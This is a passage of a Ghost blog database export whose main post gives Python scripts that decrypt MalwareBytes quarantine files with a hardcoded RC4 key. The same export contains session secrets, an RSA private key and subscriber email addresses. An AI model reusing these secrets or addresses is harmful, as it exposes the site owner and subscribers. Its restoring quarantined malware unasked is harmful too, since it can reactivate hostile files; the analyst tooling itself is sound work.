starting.","feature_image":"https://images.unsplash.com/photo-1516382799247-87df95d790b7?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=1080&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ","featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-09-05T14:04:54.000Z","updated_at":"2019-09-08T15:00:00.000Z","published_at":"2019-09-08T15:00:00.000Z","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5d815601992f0652efb51051","uuid":"105c8da8-921e-4823-b8f8-68f49b2db6f8","title":"Decrypting MalwareBytes Quarantine Files with Python","slug":"decrypting-malwarebytes-quarantine-files","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"import sys, os\\nfrom arc4 import ARC4\\nimport hashlib\\n\\n\\nif len(sys.argv) < 2:\\n\\tprint(\\\"You must include a .quar file to decrypt!\\\")\\n\\tsys.exit(1)\\n\\nwith open(sys.argv[1], \\\"rb\\\") as encrypted_file:\\n\\tarc4 = ARC4( hashlib.md5('XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb'.encode('utf-8')).digest() )\\n\\tdecrypted = arc4.decrypt(encrypted_file.read())\\n\\twith open( sys.argv[1]+\\\".decrypted\\\", \\\"wb\\\") as decrypted_file:\\n\\t\\tdecrypted_file.write(decrypted)\\n\\t\\tdecrypted_file.close()\",\"language\":\"Python\"}],[\"code\",{\"code\":\"import hashlib\\nimport sys, os\\n\\nif len(sys.argv) < 2:\\n    print(\\\"You must include a .quar file to decrypt!\\\")\\n    sys.exit(1)\\n\\ndef rc4_decrypt(sbox, data):\\n    out = bytearray(len(data))\\n    i = 0\\n    j = 0\\n    for k in range(len(data)):\\n        i = (i + 1) % 256\\n        j = (j + sbox[i]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n        val = sbox[(sbox[i] + sbox[j]) % 256]\\n        out[k] = val ^ data[k]\\n\\n    return out\\n\\ndef mbam_ksa():\\n    # hardcoded key obtained from mbamcore.dll\\n    m = hashlib.md5()\\n    m.update(\\\"XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb\\\".encode('utf-8'))\\n    key = bytearray(m.digest())\\n    sbox = list(range(256))\\n    j = 0\\n    for i in range(256):\\n        j = (j + sbox[i] + key[i % len(key)]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n\\n    return sbox\\n\\ndef mbam_unquarantine(f):\\n    with open(f, \\\"rb\\\") as quarfile:\\n        data = bytearray(quarfile.read())\\n\\n    sbox = mbam_ksa()\\n    outdata = rc4_decrypt(sbox, data)\\n\\n    return outdata\\n\\ndef main():\\n    MBAMDequarantineFile = mbam_unquarantine(sys.argv[1])\\n    with open( sys.argv[1]+\\\".decrypted2\\\", \\\"wb\\\") as decrypted_file:\\n        decrypted_file.write(MBAMDequarantineFile)\\n        decrypted_file.close()\\n\\nmain()\\n\",\"language\":\"Python\"}]],\"markups\":[[\"a\",[\"href\",\"http://www.hexacorn.com/blog/2015/11/08/decrypting-malwarebytes-quar-files/\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/lib/cuckoo/common/quarantine.py\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/docs/LICENSE\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"MalwareBytes will rename malicious files found during a virus scan to a GUID (e.g. 403dab27-42d6-40e4-8a8b-f4eb4a3ffe82) with a .quar extension. These files are encrypted using RC4 and a long 68 character key.\"]]],[1,\"p\",[[0,[],0,\"To decrypt these files, I looked online to see what was already available. I found \"],[0,[0],1,\"this blog post\"],[0,[],0,\", which included a Perl script to decrypt. Not being a fan of Perl, I decided to roll my own using Python. Below is what I came up with:\"]]],[10,0],[1,\"p\",[[0,[],0,\"This script does have a dependency of the arc4 Python library (pip3 install arc4), but it works and produces files with the same hash as the Perl script on the reference blog post.\"]]],[1,\"p\",[[0,[],0,\"The blog post also links to a Python file in the Cuckoo sandbox that is capable of decrypting MalwareBytes .quar files. This is great, because we can utilize some of their code as it's already in Python! You can find the original file \"],[0,[1],1,\"here\"],[0,[],0,\" and their GPL license file \"],[0,[2],1,\"here\"],[0,[],0,\". I took snippets of their code, updated them for Python3, and then modified it slightly to work the same as the previous script:\"]]],[10,1],[1,\"p\",[[0,[],0,\"While this script is much longer and does the exact same thing as the other one, it does not need the arc4 Python library to run.\"]]],[1,\"p\",[[0,[],0,\"Enjoy!\"]]]]}","html":"<p>MalwareBytes will rename malicious files found during a virus scan to a GUID (e.g. 403dab27-42d6-40e4-8a8b-f4eb4a3ffe82) with a .quar extension. These files are encrypted using RC4 and a long 68 character key.</p><p>To decrypt these files, I looked online to see what was already available. I found <a href=\"http://www.hexacorn.com/blog/2015/11/08/decrypting-malwarebytes-quar-files/\">this blog post</a>, which included a Perl script to decrypt. Not being a fan of Perl, I decided to roll my own using Python. Below is what I came up with:</p><!--kg-card-begin: code--><pre><code class=\"language-Python\">import sys, os\nfrom arc4 import ARC4\nimport hashlib\n\n\nif len(sys.argv) &lt; 2:\n\tprint(\"You must include a .quar file to decrypt!\")\n\tsys.exit(1)\n\nwith open(sys.argv[1], \"rb\") as encrypted_file:\n\tarc4 = ARC4( hashlib.md5('XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb'.encode('utf-8')).digest() )\n\tdecrypted = arc4.decrypt(encrypted_file.read())\n\twith open( sys.argv[1]+\".decrypted\", \"wb\") as decrypted_file:\n\t\tdecrypted_file.write(decrypted)\n\t\tdecrypted_file.close()</code></pre><!--kg-card-end: code--><p>This script does have a dependency of the arc4 Python library (pip3 install arc4), but it works and produces files with the same hash as the Perl script on the reference blog post.</p><p>The blog post also links to a Python file in the Cuckoo sandbox that is capable of decrypting MalwareBytes .quar files. This is great, because we can utilize some of their code as it's already in Python! You can find the original file <a href=\"https://github.com/brad-sp/cuckoo-modified/blob/master/lib/cuckoo/common/quarantine.py\">here</a> and their GPL license file <a href=\"https://github.com/brad-sp/cuckoo-modified/blob/master/docs/LICENSE\">here</a>. I took snippets of their code, updated them for Python3, and then modified it slightly to work the same as the previous script:</p><!--kg-card-begin: code--><pre><code class=\"language-Python\">import hashlib\nimport sys, os\n\nif len(sys.argv) &lt; 2:\n    print(\"You must include a .quar file to decrypt!\")\n    sys.exit(1)\n\ndef rc4_decrypt(sbox, data):\n    out = bytearray(len(data))\n    i = 0\n    j = 0\n    for k in range(len(data)):\n        i = (i + 1) % 256\n        j = (j + sbox[i]) % 256\n        tmp = sbox[i]\n        sbox[i] = sbox[j]\n        sbox[j] = tmp\n        val = sbox[(sbox[i] + sbox[j]) % 256]\n        out[k] = val ^ data[k]\n\n    return out\n\ndef mbam_ksa():\n    # hardcoded key obtained from mbamcore.dll\n    m = hashlib.md5()\n    m.update(\"XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb\".encode('utf-8'))\n    key = bytearray(m.digest())\n    sbox = list(range(256))\n    j = 0\n    for i in range(256):\n        j = (j + sbox[i] + key[i % len(key)]) % 256\n        tmp = sbox[i]\n        sbox[i] = sbox[j]\n        sbox[j] = tmp\n\n    return sbox\n\ndef mbam_unquarantine(f):\n    with open(f, \"rb\") as quarfile:\n        data = bytearray(quarfile.read())\n\n    sbox = mbam_ksa()\n    outdata = rc4_decrypt(sbox, data)\n\n    return outdata\n\ndef main():\n    MBAMDequarantineFile = mbam_unquarantine(sys.argv[1])\n    with open( sys.argv[1]+\".decrypted2\", \"wb\") as decrypted_file:\n        decrypted_file.write(MBAMDequarantineFile)\n        decrypted_file.close()\n\nmain()\n</code></pre><!--kg-card-end: code--><p>While this script is much longer and does the exact same thing as the other one, it does not need the arc4 Python library to run.</p><p>Enjoy!</p>","comment_id":"5d815601992f0652efb51051","plaintext":"MalwareBytes will rename malicious files found during a virus scan to a GUID\n(e.g. 403dab27-42d6-40e4-8a8b-f4eb4a3ffe82) with a .quar extension. These files\nare encrypted using RC4 and a long 68 character key.\n\nTo decrypt these files, I looked online to see what was already available. I\nfound this blog post\n[http://www.hexacorn.com/blog/2015/11/08/decrypting-malwarebytes-quar-files/],\nwhich included a Perl script to decrypt. Not being a fan of Perl, I decided to\nroll my own using Python. Below is what I came up with:\n\nimport sys, os\nfrom arc4 import ARC4\nimport hashlib\n\n\nif len(sys.argv) < 2:\n\tprint(\"You must include a .quar file to decrypt!\")\n\tsys.exit(1)\n\nwith open(sys.argv[1], \"rb\") as encrypted_file:\n\tarc4 = ARC4( hashlib.md5('XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb'.encode('utf-8')).digest() )\n\tdecrypted = arc4.decrypt(encrypted_file.read())\n\twith open( sys.argv[1]+\".decrypted\", \"wb\") as decrypted_file:\n\t\tdecrypted_file.write(decrypted)\n\t\tdecrypted_file.close()\n\nThis script does have a dependency of the arc4 Python library (pip3 install\narc4), but it works and produces files with the same hash as the Perl script on\nthe reference blog post.\n\nThe blog post also links to a Python file in the Cuckoo sandbox that is capable\nof decrypting MalwareBytes .quar files. This is great, because we can utilize\nsome of their code as it's already in Python! You can find the original file \nhere\n[https://github.com/brad-sp/cuckoo-modified/blob/master/lib/cuckoo/common/quarantine.py] \nand their GPL license file here\n[https://github.com/brad-sp/cuckoo-modified/blob/master/docs/LICENSE]. I took\nsnippets of their code, updated them for Python3, and then modified it slightly\nto work the same as the previous script:\n\nimport hashlib\nimport sys, os\n\nif len(sys.argv) < 2:\n    print(\"You must include a .quar file to decrypt!\")\n    sys.exit(1)\n\ndef rc4_decrypt(sbox, data):\n    out = bytearray(len(data))\n    i = 0\n    j = 0\n    for k in range(len(data)):\n        i = (i + 1) % 256\n        j = (j + sbox[i]) % 256\n        tmp = sbox[i]\n        sbox[i] = sbox[j]\n        sbox[j] = tmp\n        val = sbox[(sbox[i] + sbox[j]) % 256]\n        out[k] = val ^ data[k]\n\n    return out\n\ndef mbam_ksa():\n    # hardcoded key obtained from mbamcore.dll\n    m = hashlib.md5()\n    m.update(\"XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb\".encode('utf-8'))\n    key = bytearray(m.digest())\n    sbox = list(range(256))\n    j = 0\n    for i in range(256):\n        j = (j + sbox[i] + key[i % len(key)]) % 256\n        tmp = sbox[i]\n        sbox[i] = sbox[j]\n        sbox[j] = tmp\n\n    return sbox\n\ndef mbam_unquarantine(f):\n    with open(f, \"rb\") as quarfile:\n        data = bytearray(quarfile.read())\n\n    sbox = mbam_ksa()\n    outdata = rc4_decrypt(sbox, data)\n\n    return outdata\n\ndef main():\n    MBAMDequarantineFile = mbam_unquarantine(sys.argv[1])\n    with open( sys.argv[1]+\".decrypted2\", \"wb\") as decrypted_file:\n        decrypted_file.write(MBAMDequarantineFile)\n        decrypted_file.close()\n\nmain()\n\n\nWhile this script is much longer and does the exact same thing as the other one,\nit does not need the arc4 Python library to run.\n\nEnjoy!","feature_image":"https://images.unsplash.com/photo-1515879218367-8466d910aaa4?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=1080&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ","featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-09-17T21:54:09.000Z","updated_at":"2019-09-18T10:00:00.000Z","published_at":"2019-09-18T10:00:00.000Z","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null}],"posts_authors":[{"id":"5d2754b5992f0652efb50e6f","post_id":"5d2754b4992f0652efb50e6e","author_id":"5951f5fca366002ebd5dbef7","sort_order":0},{"id":"5d2754b5992f0652efb50e71","post_id":"5d2754b5992f0652efb50e70","author_id":"5951f5fca366002ebd5dbef7","sort_order":0},{"id":"5d2754b5992f0652efb50e73","post_id":"5d2754b5992f0652efb50e72","author_id":"5951f5fca366002ebd5dbef7","sort_order":0},{"id":"5d2754b5992f0652efb50e75","post_id":"5d2754b5992f0652efb50e74","author_id":"5951f5fca366002ebd5dbef7","sort_order":0},{"id":"5d2754b5992f0652efb50e77","post_id":"5d2754b5992f0652efb50e76","author_id":"5951f5fca366002ebd5dbef7","sort_order":0},{"id":"5d2754b5992f0652efb50e79","post_id":"5d2754b5992f0652efb50e78","author_id":"5951f5fca366002ebd5dbef7","sort_order":0},{"id":"5d2754b5992f0652efb50e7b","post_id":"5d2754b5992f0652efb50e7a","author_id":"5951f5fca366002ebd5dbef7","sort_order":0},{"id":"5d6eb8f7992f0652efb50f8b","post_id":"5d6eb8f7992f0652efb50f87","author_id":"1","sort_order":0},{"id":"5d6eb8f7992f0652efb50f8d","post_id":"5d6eb8f7992f0652efb50f88","author_id":"1","sort_order":0},{"id":"5d6eb8f7992f0652efb50f8e","post_id":"5d6eb8f7992f0652efb50f89","author_id":"1","sort_order":0},{"id":"5d711606992f0652efb50fa4","post_id":"5d711606992f0652efb50fa3","author_id":"1","sort_order":0},{"id":"5d815602992f0652efb51052","post_id":"5d815601992f0652efb51051","author_id":"1","sort_order":0}],"posts_tags":[{"id":"5d2754b5992f0652efb50f45","post_id":"5d2754b4992f0652efb50e6e","tag_id":"5d2754b3992f0652efb50e1c","sort_order":0},{"id":"5d2754b5992f0652efb50f46","post_id":"5d2754b5992f0652efb50e70","tag_id":"5d2754b3992f0652efb50e1c","sort_order":0},{"id":"5d2754b5992f0652efb50f47","post_id":"5d2754b5992f0652efb50e72","tag_id":"5d2754b3992f0652efb50e1c","sort_order":0},{"id":"5d2754b5992f0652efb50f48","post_id":"5d2754b5992f0652efb50e74","tag_id":"5d2754b3992f0652efb50e1c","sort_order":0},{"id":"5d2754b5992f0652efb50f49","post_id":"5d2754b5992f0652efb50e76","tag_id":"5d2754b3992f0652efb50e1c","sort_order":0},{"id":"5d2754b5992f0652efb50f4a","post_id":"5d2754b5992f0652efb50e78","tag_id":"5d2754b3992f0652efb50e1c","sort_order":0},{"id":"5d2754b5992f0652efb50f4b","post_id":"5d2754b5992f0652efb50e7a","tag_id":"5d2754b3992f0652efb50e1c","sort_order":0},{"id":"5d6eb8f7992f0652efb50f8a","post_id":"5d6eb8f7992f0652efb50f87","tag_id":"5d6eb8f7992f0652efb50f7e","sort_order":0},{"id":"5d6eb8f7992f0652efb50f8c","post_id":"5d6eb8f7992f0652efb50f88","tag_id":"5d6eb8f7992f0652efb50f7e","sort_order":0}],"roles":[{"id":"5d2754b3992f0652efb50e21","name":"Administrator","description":"Administrators","created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e22","name":"Editor","description":"Editors","created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e23","name":"Author","description":"Authors","created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e24","name":"Contributor","description":"Contributors","created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e25","name":"Owner","description":"Blog Owner","created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e26","name":"Admin Integration","description":"External Apps","created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"}],"roles_users":[{"id":"5d2754b4992f0652efb50e6d","role_id":"5d2754b3992f0652efb50e23","user_id":"5951f5fca366002ebd5dbef7"},{"id":"5d2754b5992f0652efb50f4c","role_id":"5d2754b3992f0652efb50e25","user_id":"1"}],"settings":[{"id":"5d2754b6992f0652efb50f4d","key":"db_hash","value":"474b7fb9-2e04-4743-a8f9-8f9229e263cd","type":"core","created_at":"2019-07-11T15:24:38.000Z","updated_at":"2019-07-11T15:24:38.000Z"},{"id":"5d2754b6992f0652efb50f4e","key":"next_update_check","value":"1581648894","type":"core","created_at":"2019-07-11T15:24:38.000Z","updated_at":"2020-02-13T02:54:53.000Z"},{"id":"5d2754b6992f0652efb50f4f","key":"notifications","value":"[{\"dismissible\":true,\"location\":\"bottom\",\"status\":\"alert\",\"id\":\"98160ba0-36ba-11ea-bf05-2f7a36f84748\",\"custom\":false,\"createdAt\":\"2020-01-14T10:42:43.000Z\",\"type\":\"info\",\"top\":false,\"message\":\"Ghost <a href=\\\"https://github.com/TryGhost/Ghost/releases\\\">2.38.0</a> has been released, <a href=\\\"https://ghost.org/update/?v=2.25.6\\\">click here</a> to upgrade.\",\"seen\":false,\"addedAt\":\"2020-01-14T16:44:01.818Z\"}]","type":"core","created_at":"2019-07-11T15:24:38.000Z","updated_at":"2020-01-14T16:44:01.000Z"},{"id":"5d2754b6992f0652efb50f50","key":"session_secret","value":"540db5caa7bdeb4ec70911ae8674566641225b762b864665eac35bccc377172b","type":"core","created_at":"2019-07-11T15:24:38.000Z","updated_at":"2019-07-11T15:24:38.000Z"},{"id":"5d2754b6992f0652efb50f51","key":"theme_session_secret","value":"19a08c24458ba408b7e119ccca44d74d3d065567812493e39969d3b596c0f8b5","type":"core","created_at":"2019-07-11T15:24:38.000Z","updated_at":"2019-07-11T15:24:38.000Z"},{"id":"5d2754b6992f0652efb50f52","key":"title","value":"Brandon Hinkel's Blog","type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2019-09-03T19:11:32.000Z"},{"id":"5d2754b6992f0652efb50f53","key":"description","value":"Thoughts, stories and ideas.","type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T18:38:46.000Z"},{"id":"5d2754b6992f0652efb50f54","key":"logo","value":null,"type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T19:21:51.000Z"},{"id":"5d2754b6992f0652efb50f55","key":"cover_image","value":"https://casper.ghost.org/v1.0.0/images/blog-cover.jpg","type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T18:27:17.000Z"},{"id":"5d2754b6992f0652efb50f56","key":"icon","value":null,"type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T18:27:17.000Z"},{"id":"5d2754b6992f0652efb50f57","key":"default_locale","value":"en","type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T18:27:17.000Z"},{"id":"5d2754b6992f0652efb50f58","key":"active_timezone","value":"America/New_York","type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T19:21:51.000Z"},{"id":"5d2754b6992f0652efb50f59","key":"force_i18n","value":"true","type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T18:27:17.000Z"},{"id":"5d2754b6992f0652efb50f5b","key":"amp","value":"true","type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T18:27:17.000Z"},{"id":"5d2754b6992f0652efb50f5c","key":"ghost_head","value":null,"type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T18:27:17.000Z"},{"id":"5d2754b6992f0652efb50f5d","key":"ghost_foot","value":null,"type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T18:27:17.000Z"},{"id":"5d2754b6992f0652efb50f5e","key":"facebook","value":null,"type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T18:27:17.000Z"},{"id":"5d2754b6992f0652efb50f5f","key":"twitter","value":null,"type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T18:27:17.000Z"},{"id":"5d2754b6992f0652efb50f60","key":"labs","value":"{\"publicAPI\":true,\"subscribers\":true}","type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-09-10T02:17:10.000Z"},{"id":"5d2754b6992f0652efb50f61","key":"navigation","value":"[{\"label\":\"Home\",\"url\":\"/\"}]","type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T19:21:51.000Z"},{"id":"5d2754b6992f0652efb50f62","key":"slack","value":"[]","type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2019-09-03T19:11:32.000Z"},{"id":"5d2754b6992f0652efb50f63","key":"unsplash","value":"{\"isActive\":true}","type":"blog","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T19:21:51.000Z"},{"id":"5d2754b6992f0652efb50f64","key":"active_theme","value":"casper","type":"theme","created_at":"2019-07-11T15:24:38.000Z","updated_at":"2019-07-11T15:24:38.000Z"},{"id":"5d2754b6992f0652efb50f65","key":"is_private","value":"false","type":"private","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T18:27:17.000Z"},{"id":"5d2754b6992f0652efb50f66","key":"password","value":null,"type":"private","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T18:27:17.000Z"},{"id":"5d2754b6992f0652efb50f67","key":"public_hash","value":"c8d0897400da36165b0c7bcc5a4ca0","type":"private","created_at":"2018-08-03T18:27:17.000Z","updated_at":"2018-08-03T18:27:17.000Z"},{"id":"5d2754b6992f0652efb50f68","key":"members_public_key","value":"-----BEGIN RSA PUBLIC KEY-----\nMIGJAoGBAISpEHDR5qn7ajYLqE9kINuGOmaaKFKqJJeXlOG+HMkgBf9RfOkq1gGAA1wOCPcb\ndgxmuwR+dNjDlVlw1/2X6LurzX8GwXOCWa1hiGGdIYYqDP1O6togmOs7aC7rL9rqU5vn2LBi\nwUI0qK+c0fqmU8XRDkiawznDR5B2OwVJgLxbAgMBAAE=\n-----END RSA PUBLIC KEY-----\n","type":"members","created_at":"2019-07-11T15:24:38.000Z","updated_at":"2019-07-11T15:24:38.000Z"},{"id":"5d2754b6992f0652efb50f69","key":"members_private_key","value":"-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQCEqRBw0eap+2o2C6hPZCDbhjpmmihSqiSXl5ThvhzJIAX/UXzpKtYBgANc\nDgj3G3YMZrsEfnTYw5VZcNf9l+i7q81/BsFzglmtYYhhnSGGKgz9TuraIJjrO2gu6y/a6lOb\n59iwYsFCNKivnNH6plPF0Q5ImsM5w0eQdjsFSYC8WwIDAQABAoGAGReRUIWjR4uSb16NG1cp\nD9y3tyh5cAlWmoXFV12KPFCeUcisA75idC4udH8DGxpKndXgkd0JZOa5nQ1HDWRqVK9Wf59z\nX2PusicFHYLYRb7CAgOpSb8zu3J5YekfdDrwB9r73SanWfBC8DFL7UTF8p80TbPc+0CLopXd\n9YqbZYECQQC6MgVfIV/uVp8Q3dxnRc33wBR0M4sVpB2N6rIerhJVTmKGHHcw/G+xnDeiI5gF\niFIhm5LL6uDa0pVPBQLc/eNrAkEAtmUO9/C5ohg+MSAPP3yLMg7F4INR12D22mlSyFkyBbD9\nWLyiOAlfx0OkFi/cS0/3a5EsbbniK3l1thw/iqS20QJBAISAgE4YhBoqTnxERkq/5DlA2c1v\nuLSn29hYgnVOzwEiDP7/VtrnadztHLInvlGBl2EPQ0IWXfmbDmHzYPw/OQ0CQQCUoK0d5Y+f\nQtoK9fD27uoOlHMyjE/4jg8Z05GdqPFWKe+Ii840k470tW3UlpOQ20zm3pmxoDNo8cS17Tbq\nJ2bBAkAv0fEHp9dr5xU287Hsff2bKfpKWUBTnhwU1dBTpY8Iy9gGU7hzixtjPnD6ZZUA4xsm\n7glIQeUhRQeCxjUvcrDU\n-----END RSA PRIVATE KEY-----\n","type":"members","created_at":"2019-07-11T15:24:38.000Z","updated_at":"2019-07-11T15:24:38.000Z"},{"id":"5d2754b6992f0652efb50f6a","key":"members_session_secret","value":"a1ec7f28b3717330af9703258def874c1b7713c4c74d287ae1906e33cdeab11f","type":"members","created_at":"2019-07-11T15:24:38.000Z","updated_at":"2019-07-11T15:24:38.000Z"},{"id":"5d2754b6992f0652efb50f6b","key":"members_subscription_settings","value":"{\"isPaid\":false,\"paymentProcessors\":[{\"adapter\":\"stripe\",\"config\":{\"secret_token\":\"\",\"public_token\":\"\",\"product\":{\"name\":\"Ghost Subscription\"},\"plans\":[{\"name\":\"Monthly\",\"currency\":\"usd\",\"interval\":\"month\",\"amount\":\"\"},{\"name\":\"Yearly\",\"currency\":\"usd\",\"interval\":\"year\",\"amount\":\"\"}]}}]}","type":"members","created_at":"2019-07-11T15:24:38.000Z","updated_at":"2019-07-11T15:24:38.000Z"}],"subscribers":[{"id":"5d3da559992f0652efb50f6e","name":null,"email":"brandonhinkel.com@domstat.su","status":"subscribed","post_id":null,"subscribed_url":null,"subscribed_referrer":null,"unsubscribed_url":null,"unsubscribed_at":null,"created_at":"2019-07-28T13:38:33.000Z","updated_at":"2019-07-28T13:38:33.000Z"},{"id":"5d6eb8f7992f0652efb50f7f","name":null,"email":"vivienc69026@gmail.com","status":"subscribed","post_id":null,"subscribed_url":null,"subscribed_referrer":null,"unsubscribed_url":null,"unsubscribed_at":null,"created_at":"2018-08-18T03:24:34.000Z","updated_at":"2018-08-18T03:24:34.000Z"},{"id":"5d6eb8f7992f0652efb50f80","name":null,"email":"16313Duntz@hotmail.com","status":"subscribed","post_id":null,"subscribed_url":null,"subscribed_referrer":null,"unsubscribed_url":null,"unsubscribed_at":null,"created_at":"2018-10-01T04:17:24.000Z","updated_at":"2018-10-01T04:17:24.000Z"},{"id":"5d6eb8f7992f0652efb50f81","name":null,"email":"Witt19594@yahoo.com","status":"subscribed","post_id":null,"subscribed_url":null,"subscribed_referrer":null,"unsubscribed_url":null,"unsubscribed_at":null,"created_at":"2018-10-11T10:28:49.000Z","updated_at":"2018-10-11T10:28:49.000Z"},{"id":"5d6eb8f7992f0652efb50f82","name":null,"email":"13050Commons@hotmail.com","status":"subscribed","post_id":null,"subscribed_url":null,"subscribed_referrer":null,"unsubscribed_url":null,"unsubscribed_at":null,"created_at":"2018-10-29T01:16:48.000Z","updated_at":"2018-10-29T01:16:48.000Z"},{"id":"5d6eb8f7992f0652efb50f83","name":null,"email":"Klever42205@yahoo.com","status":"subscribed","post_id":null,"subscribed_url":null,"subscribed_referrer":null,"unsubscribed_url":null,"unsubscribed_at":null,"created_at":"2018-11-18T07:08:33.000Z","updated_at":"2018-11-18T07:08:33.000Z"},{"id":"5d6eb8f7992f0652efb50f84","name":null,"email":"4269Harvilchuck@hotmail.com","status":"subscribed","post_id":null,"subscribed_url":null,"subscribed_referrer":null,"unsubscribed_url":null,"unsubscribed_at":null,"created_at":"2018-11-18T17:23:41.000Z","updated_at":"2018-11-18T17:23:41.000Z"},{"id":"5d6eb8f7992f0652efb50f85","name":null,"email":"Duverne11@yahoo.com","status":"subscribed","post_id":null,"subscribed_url":null,"subscribed_referrer":null,"unsubscribed_url":null,"unsubscribed_at":null,"created_at":"2019-02-01T18:01:41.000Z","updated_at":"2019-02-01T18:01:41.000Z"},{"id":"5d6eb8f7992f0652efb50f86","name":null,"email":"chad@chadcole.ca","status":"subscribed","post_id":null,"subscribed_url":"https://b4nd.it/","subscribed_referrer":"https://b4nd.it/getting-started-with-the-proxmark3-easy/","unsubscribed_url":null,"unsubscribed_at":null,"created_at":"2019-03-27T22:35:59.000Z","updated_at":"2019-03-27T22:35:59.000Z"},{"id":"5d6ebb59992f0652efb50f92","name":null,"email":"brandon.hinkel@gmail.com","status":"subscribed","post_id":null,"subscribed_url":null,"subscribed_referrer":null,"unsubscribed_url":null,"unsubscribed_at":null,"created_at":"2019-09-03T19:13:29.000Z","updated_at":"2019-09-03T19:13:29.000Z"},{"id":"5dc20fa1992f0652efb510bb","name":null,"email":"paulnorman8869@gmail.com","status":"subscribed","post_id":null,"subscribed_url":null,"subscribed_referrer":null,"unsubscribed_url":null,"unsubscribed_at":null,"created_at":"2019-11-06T00:11:13.000Z","updated_at":"2019-11-06T00:11:13.000Z"},{"id":"5dcfdaac992f0652efb510bc","name":null,"email":"d69aaf141c9ec54eab39bba0e3339415@pubrelay.info","status":"subscribed","post_id":null,"subscribed_url":null,"subscribed_referrer":null,"unsubscribed_url":null,"unsubscribed_at":null,"created_at":"2019-11-16T11:17:00.000Z","updated_at":"2019-11-16T11:17:00.000Z"},{"id":"5e051b51992f0652efb510c2","name":null,"email":"danielglenn5153@gmail.com","status":"subscribed","post_id":null,"subscribed_url":null,"subscribed_referrer":null,"unsubscribed_url":null,"unsubscribed_at":null,"created_at":"2019-12-26T20:42:57.000Z","updated_at":"2019-12-26T20:42:57.000Z"},{"id":"5e2a62b3992f0652efb510c6","name":null,"email":"akoga2@gmailbox.org","status":"subscribed","post_id":"5d6eb8f7992f0652efb50f87","subscribed_url":"https://brandonhinkel.com/breaking-hardened-mifare-proxmark3/","subscribed_referrer":"https://brandonhinkel.com/author/brandon/","unsubscribed_url":null,"unsubscribed_at":null,"created_at":"2020-01-24T03:21:23.000Z","updated_at":"2020-01-24T03:21:23.000Z"}],"tags":[{"id":"5d2754b3992f0652efb50e1c","name":"Getting 